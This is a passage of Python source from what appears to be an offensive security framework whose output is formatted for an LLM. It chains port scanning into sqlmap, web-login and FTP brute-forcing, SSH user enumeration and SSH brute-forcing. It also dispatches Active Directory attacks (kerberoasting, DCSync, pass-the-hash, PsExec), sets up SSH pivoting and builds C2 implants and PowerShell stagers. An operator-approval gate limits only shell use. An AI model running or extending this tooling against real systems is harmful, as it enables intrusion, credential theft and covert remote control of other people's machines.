        print(f"  [{key}] {name:<15}")
    print("\n  [a] Run all standard (fast/concurrent)")
    print("  [n] Run standard + smart extended (auto-detects SSH/Web/FTP)")
    print("  [x] Run EVERYTHING applicable (safe/deep + gated report)")

    choice = input("\nChoice(s) e.g. 1 2 4 or a: ").strip().lower()
    interactive_context = ExecutionContext.operator(
        actor="interactive_cli",
        approval_id=f"interactive-menu:{choice or 'empty'}",
        target_scope=(target,),
        allow_active_tools=True,
    )

    if choice == "a":
        results = run_default_recon(target)
        return format_recon_for_llm(results)

    if choice == "x":
        results = run_default_recon(target)
        results = _run_exhaustive_applicable_coverage(target, results)
        print("\n  [*] Phase 3: Kill chain vulnerability assessment...")
        try:
            from core.killchain import vuln_assess
            recon_blob = format_recon_for_llm(results)
            results["vuln_assess"] = vuln_assess(target, recon_blob)
        except ImportError:
            results["vuln_assess"] = "[!] core.killchain package not found — skipping vuln assessment"
        except Exception as exc:
            results["vuln_assess"] = f"[!] vuln_assess error: {exc}"
        return format_recon_for_llm(results)

    if choice == "n":
        results = run_default_recon(target)
        n_mode_plan = ["[N MODE PLAN]", "base: run_default_recon"]

        # ── PORT-AWARE EXTENDED TOOLS ──────────────────────────
        nmap_output = results.get("nmap", "")
        curl_output = results.get("curl_headers", "")
        whatweb_output = results.get("whatweb", "")
        all_recon = nmap_output + curl_output + whatweb_output

        # ── Scrape ALL detected web-like ports individually ──────
        web_ports_detected = _detect_web_ports_from_nmap(nmap_output)

        # Improved web detection: check nmap + curl + whatweb
        has_web = (len(web_ports_detected) > 0
                   or "HTTP/" in curl_output
                   or "nginx" in all_recon.lower()
                   or "apache" in all_recon.lower()
                   or "Server:" in curl_output)
        has_ssh = "22/tcp" in nmap_output and "open" in nmap_output
        has_ftp = "21/tcp" in nmap_output and "open" in nmap_output

        if not web_ports_detected and has_web:
            web_ports_detected = ["80"]  # default
        web_urls = _web_urls_from_ports(target, web_ports_detected) if has_web else []

        # ── PHASE 1: Run web tools and SSH user enum in parallel ──
        phase1_futures = {}
        enum_users = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
            if has_web:
                print(f"\n  [*] Web ports detected {web_ports_detected} — running extended web tools...")
                n_mode_plan.append(f"web_surface: present ports={','.join(web_ports_detected)}")
                phase1_futures[executor.submit(run_wpscan, target)] = "wpscan"
                phase1_futures[executor.submit(run_sqlmap, target)] = "sqlmap"
                phase1_futures[executor.submit(run_nikto, target)] = "nikto"
                phase1_futures[executor.submit(run_web_login_bruteforce, target)] = "web_login_brute"

                # Scrape each web port independently.
                for wp in web_ports_detected:
                    proto = "https" if wp in ("443", "8443", "1443") else "http"
                    scrape_url = f"{proto}://{target}:{wp}" if wp not in ("80", "443") else f"{proto}://{target}"
                    phase1_futures[executor.submit(run_scrapling_fetch, scrape_url)] = f"scrapling_port{wp}"
                    print(f"    [*] Scrapling: {scrape_url}")

                # Run Nikto only on the primary port to avoid duplicate instances.
                # was blocking the agent for 15+ minutes with timeouts
                # Non-standard ports are covered by scrapling + nmap scripts
            else:
                print("\n  [*] No web ports open — skipping wpscan, sqlmap, nikto")
                n_mode_plan.append("web_surface: not_detected")

            if has_ssh:
                print("  [*] SSH detected — running user enumeration first...")
                n_mode_plan.append("ssh_surface: present")
                phase1_futures[executor.submit(run_ssh_user_enum, target)] = "ssh_user_enum"

            if has_ftp:
                print("  [*] FTP detected — running bruteforce...")
                n_mode_plan.append("ftp_surface: present")
                phase1_futures[executor.submit(run_bruteforce, "ftp", target)] = "ftp_bruteforce"

            if not phase1_futures:
                print("  [*] No exploitable services found for extended tools.")

            for future in concurrent.futures.as_completed(phase1_futures):
                tool_name = phase1_futures[future]
                try:
                    result = future.result()
                    results[tool_name] = result
                    if tool_name == "ssh_user_enum":
                        result_str = str(result)
                        if "UNRELIABLE" in result_str:
                            print("  [!] SSH user enum results UNRELIABLE (server patched) — using defaults")
                        elif "VALID USER" in result_str:
                            import re as _re
                            for m in _re.finditer(r'[✓]\s+(\S+)', result_str):
                                enum_users.append(m.group(1))
                            print(f"  [+] SSH enum found {len(enum_users)} valid users: {enum_users}")
                except Exception as exc:
                    results[tool_name] = f"[!] {tool_name} error: {exc}"

        # ── PHASE 2: SSH bruteforce with discovered users ──
        if has_ssh:
            print(f"\n  [*] Phase 2: SSH bruteforce with {len(enum_users) if enum_users else 'default'} users...")
            try:
                results["ssh_bruteforce"] = run_bruteforce("ssh", target, extra_users=enum_users or None)
            except Exception as exc:
                results["ssh_bruteforce"] = f"[!] ssh_bruteforce error: {exc}"

        # ── PHASE 2.5: Registry-aware safe/deep coverage ─────────
        print("\n  [*] Phase 2.5: Registry-aware safe/deep coverage...")
        if _target_looks_domain(target):
            for tool_name in ("subfinder", "amass_enum", "dnsx", "wayback_urls", "gau_urls"):
                _run_registered_extended_tool(results, n_mode_plan, tool_name, target)
        else:
            n_mode_plan.append("asm_domain_discovery: not_applicable:target_is_ip")

        for tool_name in ("httpx_probe", "naabu", "tlsx"):
            _run_registered_extended_tool(results, n_mode_plan, tool_name, target)

        if has_web:
            for url in web_urls:
                suffix = re.sub(r"[^a-zA-Z0-9]+", "_", url).strip("_").lower()
                for tool_name in ("security_headers_check", "cors_check", "nuclei_safe", "katana_crawl"):
                    _run_registered_extended_tool(
                        results, n_mode_plan, tool_name, url,
                        result_key=f"{tool_name}_{suffix}",
                    )
                for spec_path in ("/openapi.json", "/swagger.json", "/api-docs"):
                    _run_registered_extended_tool(
                        results, n_mode_plan, "openapi_import", url.rstrip("/") + spec_path,
                        result_key=f"openapi_import_{suffix}{spec_path.replace('/', '_')}",
                    )
                _run_registered_extended_tool(
                    results, n_mode_plan, "graphql_check", url.rstrip("/") + "/graphql",
                    result_key=f"graphql_check_{suffix}",
                )
        else:
            n_mode_plan.append("web_deep_tools: not_applicable:no_web_surface")

        if _nmap_has_any_open_port(nmap_output, {"389", "636", "88", "445", "135", "5985", "5986"}):
            for tool_name in ("ad_enum", "gpo_review", "adcs_review"):
                _run_registered_extended_tool(results, n_mode_plan, tool_name, target)
        else:
            n_mode_plan.append("ad_security_review: not_applicable:no_ad_surface_ports")

        n_mode_plan.append("secrets/code/cloud: not_applicable:requires_local_repo_or_cloud_provider_context")
        results["n_mode_plan"] = "\n".join(n_mode_plan)

        # Phase 3: vulnerability assessment
        print("\n  [*] Phase 3: Kill chain vulnerability assessment...")
        try:
            from core.killchain import vuln_assess
            recon_blob = format_recon_for_llm(results)
            results["vuln_assess"] = vuln_assess(target, recon_blob)
        except ImportError:
            results["vuln_assess"] = "[!] core.killchain package not found — skipping vuln assessment"
        except Exception as exc:
            results["vuln_assess"] = f"[!] vuln_assess error: {exc}"

        return format_recon_for_llm(results)

    combined = {}
    for key in choice.split():
        if key in TOOLS_MENU:
            name, _func = TOOLS_MENU[key]
            print(f"\n[*] Running {name}...")
            combined[name] = run_single_tool(key, target, interactive_context)
        else:
            print(f"[!] Unknown option: {key}")

    return format_recon_for_llm(combined)


# TYPED COMMAND RUNNER + EXPLICIT MANAGED SHELL

def _terminate_process_group(
    proc: subprocess.Popen,
    *,
    grace_seconds: float = 0.75,
) -> None:
    if proc.poll() is not None:
        return
    try:
        if os.name == "posix":
            os.killpg(proc.pid, signal.SIGTERM)
        else:
            proc.terminate()
    except (AttributeError, ProcessLookupError, PermissionError, OSError):
        with contextlib.suppress(ProcessLookupError, OSError):
            proc.terminate()
    try:
        proc.wait(timeout=max(0.0, grace_seconds))
        return
    except subprocess.TimeoutExpired:
        pass
    try:
        if os.name == "posix":
            os.killpg(proc.pid, signal.SIGKILL)
        else:
            proc.kill()
    except (AttributeError, ProcessLookupError, PermissionError, OSError):
        with contextlib.suppress(ProcessLookupError, OSError):
            proc.kill()


def _execute_process(
    command,
    *,
    context: ExecutionContext,
    tool: str,
    timeout: int,
    shell: bool,
    display_command: str,
) -> ToolResult:
    """Execute one authorized process with wall-time and output-byte limits."""
    import threading
    import time

    output_chunks = []
    status_lines = []
    output_bytes = 0
    output_limited = False
    start_time = time.monotonic()
    exit_code = -1
    cancel_reason = ""
    proc = None
    reader = None
    timeout = max(1, min(int(timeout), int(context.max_runtime_seconds)))
    heartbeat_interval = 60 if timeout > 300 else 30
    redacted_command = _redact_command(display_command)
    print(f"  [*] Executing authorized {'shell' if shell else 'command'}: {redacted_command}")

    try:
        # S603: argv/shell mode reached this helper only after ExecutionPolicy
        # authorization; managed-shell access additionally needs operator approval.
        proc = subprocess.Popen(
            command,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=False,
            bufsize=0,
            start_new_session=(os.name == "posix"),
        )

        def _read() -> None:
            nonlocal output_bytes, output_limited
            if proc.stdout is None:
                return
            while True:
                chunk = proc.stdout.read(4096)
                if not chunk:
                    break
                remaining = context.max_output_bytes - output_bytes
                if len(chunk) >= remaining:
                    if remaining > 0:
                        output_chunks.append(chunk[:remaining])
                        output_bytes += remaining
                    output_limited = True
                    status_lines.append(
                        f"[OUTPUT LIMIT] process killed at {context.max_output_bytes} bytes"
                    )
                    _terminate_process_group(proc)
                    break
                output_bytes += len(chunk)
                output_chunks.append(chunk)
                rendered_chunk = chunk.decode("utf-8", "replace")
                if tool == "nuclei":
                    for line in rendered_chunk.splitlines():
                        rendered = _nuclei_live_summary(line)
                        if rendered:
                            elapsed = int(time.monotonic() - start_time)
                            print(f"      [{elapsed}s] {rendered[:160]}")
                    continue
                if any(keyword in rendered_chunk.lower() for keyword in (
                    "host:", "found", "valid", "success", "open",
                    "vuln", "error", "complete", "[+]", "session",
                )):
                    elapsed = int(time.monotonic() - start_time)
                    preview = _redact_command(rendered_chunk.replace("\n", " "))[:140]
                    print(f"      [{elapsed}s] {preview}")

        reader = threading.Thread(target=_read, daemon=True)
        reader.start()
        timed_out = False
        while reader.is_alive():
            reader.join(timeout=min(heartbeat_interval, 1))
            elapsed_float = time.monotonic() - start_time
            elapsed = int(elapsed_float)
            if context.cancellation.cancelled:
                cancel_reason = context.cancellation.reason_code
                _terminate_process_group(proc)
                reader.join(timeout=2)
                status_lines.append(f"[CANCELLED] {cancel_reason}")
                break
            if elapsed_float >= timeout:
                timed_out = True
                _terminate_process_group(proc)
                reader.join(timeout=2)
                status_lines.append(f"[TIMEOUT] {tool} killed after {_fmt_elapsed(timeout)}")
                break
            if reader.is_alive() and elapsed and elapsed % heartbeat_interval == 0:
                print(
                    f"      [♻ {tool} running... {_fmt_elapsed(elapsed)} / "
                    f"{_fmt_elapsed(timeout)} max]"
                )

        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            _terminate_process_group(proc)
            proc.wait(timeout=5)
        if proc.stdout is not None:
            proc.stdout.close()
        exit_code = proc.returncode if proc.returncode is not None else -1
        if timed_out and exit_code == 0:
            exit_code = -1
        if output_limited and exit_code == 0:
            exit_code = -1
    except KeyboardInterrupt as exc:
        context.cancellation.cancel("keyboard_interrupt")
        if proc is not None:
            _terminate_process_group(proc)
        if reader is not None:
            reader.join(timeout=2)
        partial = b"".join(output_chunks).decode("utf-8", "replace").rstrip("\n")
        raise ExecutionCancelled(
            context.cancellation.reason_code,
            stdout=partial,
            returncode=proc.returncode if proc is not None else None,
        ) from exc
    except Exception as exc:
        if proc is not None:
            _terminate_process_group(proc)
        safe_error = _redact_command(str(exc))[:1024]
        duration = time.monotonic() - start_time
        return ToolResult(
            tool_name=tool,
            command=redacted_command,
            stdout=f"[!] Command failed: {type(exc).__name__}: {safe_error}",
            stderr=safe_error,
            exit_code=-1,
            duration=duration,
        )

    output = b"".join(output_chunks).decode("utf-8", "replace").rstrip("\n")
    if status_lines:
        output = "\n".join(part for part in (output, *status_lines) if part)
    duration = time.monotonic() - start_time
    if cancel_reason:
        raise ExecutionCancelled(
            cancel_reason,
            stdout=output,
            returncode=exit_code,
        )
    if not output.strip():
        output = "[!] Command returned no output."
    output = _truncate_output_text(output, context.max_output_bytes)
    return ToolResult(
        tool_name=tool,
        command=redacted_command,
        stdout=output,
        exit_code=exit_code,
        duration=duration,
    )


def _tool_timeout(tool: str, context: ExecutionContext) -> int:
    try:
        nuclei_timeout = max(1, int(get_tool_config("nuclei").get("timeout", 1200)))
    except Exception:
        nuclei_timeout = 1200
    timeout_map = {
        "rustscan": 300,
        "nuclei": nuclei_timeout,
    }
    return min(timeout_map.get(tool, 120), context.max_runtime_seconds)


def run_managed_shell(cmd_str: str, execution_context: ExecutionContext) -> ToolResult:
    """Run shell syntax only when an operator supplied approval and capability."""
    context = _execution_context_or_current(execution_context)
    decision = _EXECUTION_POLICY.authorize_shell(cmd_str, context)
    if not decision.allowed:
        return ToolResult(
            tool_name="shell",
            command="[DENIED]",
            stdout=_execution_denied(decision.reason, context.request_id),
            exit_code=-1,
        )
    tool = decision.invocation.executable if decision.invocation else "shell"
    # S604: shell=True is intentional only at this approved managed-shell boundary.
    return _execute_process(
        cmd_str,
        context=context,
        tool=tool,
        timeout=_tool_timeout(tool, context),
        shell=True,
        display_command=cmd_str,
    )


def run_arbitrary_cmd(
    cmd_str: str,
    execution_context: Optional[ExecutionContext] = None,
) -> str:
    """Dispatch a typed command; shell syntax needs explicit operator approval.

    This name is retained for compatibility. Automatic callers no longer get
    arbitrary process execution: registered tools are invoked through their
    typed Python functions, one compatibility binary is argv-only allowlisted,
    and every unknown command fails closed.
    """
    context = _execution_context_or_current(execution_context)
    decision = _EXECUTION_POLICY.authorize_command(cmd_str, context)
    if not decision.allowed:
        return _execution_denied(decision.reason, context.request_id)
    invocation = decision.invocation
    if invocation is None:
        return _execution_denied("missing_typed_invocation", context.request_id)
    if invocation.uses_shell:
        return run_managed_shell(cmd_str, context)
    if invocation.registered_name:
        return run_tool_by_command(cmd_str, context)
    return _execute_process(
        list(invocation.argv),
        context=context,
        tool=invocation.executable,
        timeout=_tool_timeout(invocation.executable, context),
        shell=False,
        display_command=shlex.join(invocation.argv),
    )


# AD TOOL HANDLERS

def _creds_to_dict(creds, service: str = "") -> dict:
    """Normalize legacy tuple credentials to the dict shape AD modules expect."""
    if isinstance(creds, dict):
        user = creds.get("user") or creds.get("username") or ""
        password = creds.get("password") or creds.get("pwd") or ""
        return {
            "user": user,
            "username": user,
            "password": password,
            "domain": creds.get("domain", ""),
            "nthash": creds.get("nthash", ""),
            "service": creds.get("service", service),
            "port": creds.get("port", 22 if service == "ssh" else 0),
        }
    if isinstance(creds, (tuple, list)) and len(creds) >= 2:
        user, password = creds[0], creds[1]
        if user and password:
            return {
                "user": user,
                "username": user,
                "password": password,
                "domain": "",
                "nthash": "",
                "service": service,
                "port": 22 if service == "ssh" else 0,
            }
    return {"user": "", "username": "", "password": "", "domain": "", "nthash": "", "service": service, "port": 0}


def _run_ad_tool(action: str, target: str) -> str:
    """Dispatch Active Directory attack tools."""
    import logging
    logger = logging.getLogger("octopus.runner.ad")

    try:
        creds = _creds_to_dict(get_best_creds_for_target(target, "ldap"), "ldap")
        if not creds["user"]:
            creds = _creds_to_dict(get_best_creds_for_target(target, "ssh"), "ssh")
        user = creds.get("user", "")

        if action == "enum":
            from core.killchain.ad.enumeration import run_ad_enum
            return run_ad_enum(target, creds=creds if user else None)
        elif action == "asrep":
            from core.killchain.ad.kerberos import asrep_roast
            return asrep_roast(target, creds=creds if user else None)
        elif action == "kerberoast":
            from core.killchain.ad.kerberos import kerberoast
            if not user:
                return "[!] Kerberoasting requires valid domain credentials. Run bruteforce or find creds first."
            return kerberoast(target, creds)
        elif action == "dcsync":
            from core.killchain.ad.credential import dcsync
            if not user:
                return "[!] DCSync requires domain admin credentials."
            return dcsync(target, creds)
        elif action == "pth":
            from core.killchain.ad.credential import pass_the_hash
            nthash = input("\033[36m  NT Hash: \033[0m").strip()
            if not nthash:
                return "[!] Pass-the-Hash requires an NT hash."
            return pass_the_hash(target, user or "Administrator", nthash, domain=creds.get("domain", ""))
        elif action == "psexec":
            from core.killchain.ad.lateral import psexec
            if not user:
                return "[!] PsExec requires valid credentials."
            return psexec(target, creds)
        elif action == "wmiexec":
            from core.killchain.ad.lateral import wmiexec
            if not user:
                return "[!] WMIExec requires valid credentials."
            return wmiexec(target, creds)
        else:
            return f"[!] Unknown AD action: {action}"
    except ImportError as e:
        return f"[!] AD module dependency missing: {e}\n    Install: pip install impacket ldap3"
    except Exception as e:
        logger.error(f"AD tool {action} failed: {e}")
        return f"[!] AD {action} failed: {e}"


# PIVOT TOOL HANDLERS

def _run_pivot_tool(action: str, target: str) -> str:
    """Dispatch pivoting tools."""
    import logging
    logger = logging.getLogger("octopus.runner.pivot")

    try:
        creds = _creds_to_dict(get_best_creds_for_target(target, "ssh"), "ssh")
        user = creds.get("user", "")
        password = creds.get("password", "")

        if not user:
            return "[!] Pivoting requires SSH credentials. Find credentials first."

        try:
            import paramiko  # type: ignore[import-untyped]
        except ImportError:
            return "[!] paramiko not installed. Fix: pip install paramiko"

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        port = int(creds.get("port", 22))
        ssh.connect(target, port=port, username=user, password=password, timeout=15)

        if action == "socks":
            from core.killchain.pivot import setup_socks_proxy
            local_port = int(input("\033[36m  Local SOCKS port [1080]: \033[0m").strip() or "1080")
            return setup_socks_proxy(ssh, local_port=local_port)
        elif action == "forward":
            from core.killchain.pivot import setup_local_forward
            local_port = int(input("\033[36m  Local port: \033[0m").strip() or "8080")
            remote_host = input("\033[36m  Remote host [127.0.0.1]: \033[0m").strip() or "127.0.0.1"
            remote_port = int(input("\033[36m  Remote port: \033[0m").strip() or "80")
            return setup_local_forward(ssh, local_port, remote_host, remote_port)
        elif action == "netinfo":
            from core.killchain.pivot import get_network_info
            return get_network_info(ssh)
        else:
            ssh.close()
            return f"[!] Unknown pivot action: {action}"
    except Exception as e:
        logger.error(f"Pivot tool {action} failed: {e}")
        return f"[!] Pivot {action} failed: {e}"


# C2 BUILD HANDLERS

def _run_c2_build(build_type: str, target: str) -> str:
    """Dispatch C2 implant build tools."""
    import logging
    logger = logging.getLogger("octopus.runner.c2")

    try:
        c2_url = input("\033[36m  C2 URL [http://127.0.0.1:8443]: \033[0m").strip() or "http://127.0.0.1:8443"

        if build_type == "go":
            # Existing garble builder
            from core.c2.builder import build_implant
            goos = input("\033[36m  Target OS [linux]: \033[0m").strip() or "linux"
            goarch = input("\033[36m  Target Arch [amd64]: \033[0m").strip() or "amd64"
            return build_implant(
                c2_urls=[c2_url], os_target=goos, arch_target=goarch
            )

        elif build_type == "python":
            from core.c2.implants.python_implant import generate_python_implant
            code = generate_python_implant(c2_urls=[c2_url], beacon_interval=60)
            out_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                                    "data", f"implant_python_{target.replace('.', '_')}.py")
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with open(out_path, "w") as f:
                f.write(code)
            return f"[+] Python implant generated: {out_path}\n    Size: {len(code)} bytes\n    C2: {c2_url}"

        elif build_type == "powershell":
            from core.c2.implants.powershell_stager import generate_ps_encoded, generate_ps_stager
            method = input("\033[36m  Method (iex/encoded) [iex]: \033[0m").strip() or "iex"
            code = generate_ps_encoded(c2_url) if method == "encoded" else generate_ps_stager(c2_url, method="iex")
            out_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                                    "data", f"stager_{target.replace('.', '_')}.ps1")
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with open(out_path, "w") as f:
                f.write(code)
            return f"[+] PowerShell stager generated: {out_path}\n    C2: {c2_url}"

        elif build_type == "dns":
            from core.c2.channels.dns import DNSChannel
            domain = input("\033[36m  DNS C2 domain: \033[0m").strip()
            if not domain:
                return "[!] DNS C2 requires a domain name."
            _channel = DNSChannel(domain)
            return f"[+] DNS C2 channel configured for: {domain}\n    Use channel.start_listener() to begin receiving beacons."

        else:
            return f"[!] Unknown build type: {build_type}"
    except ImportError as e:
        return f"[!] C2 module dependency missing: {e}"
    except Exception as e:
        logger.error(f"C2 build {build_type} failed: {e}")
        return f"[!] C2 build failed: {e}"


# QUICK TEST

if __name__ == "__main__":
    target = input("Enter test target (IP or domain): ").strip()
    results = run_default_recon(target)
    print(format_recon_for_llm(results))
